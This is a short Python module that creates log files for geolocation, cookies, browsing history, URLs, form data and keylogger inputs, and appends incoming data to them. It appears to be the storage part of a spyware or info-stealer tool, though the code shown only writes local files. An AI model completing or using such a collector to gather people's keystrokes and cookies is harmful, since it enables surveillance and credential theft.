import os

a = __file__
a = a[:-6]+"logs\\"
print(a)
Geo_file = a + "geo.txt"
Cks_file = a + "cookies.txt"
his_file = a + "historial.txt"
url_file = a + "URL.txt"
FD_file  = a + "Form_Data.txt"
KLg_file = a + "keylogger_inputs.txt"
Files = [Geo_file,Cks_file,his_file,url_file,FD_file,KLg_file]
DFiles = {"Geo": 0, "Coo": 1, "His": 2, "Url": 3, "Form": 4, "Key": 5}

def main():


    

    for i in Files:
        f = open(i, "w")
        f.write(i)
        f.close()

def log(file, data):
    file = DFiles[file]
    print(Files[file])
    f = open(Files[file], "a")
    f.write(data.decode("utf-8")+"\n")
    f.close
    pass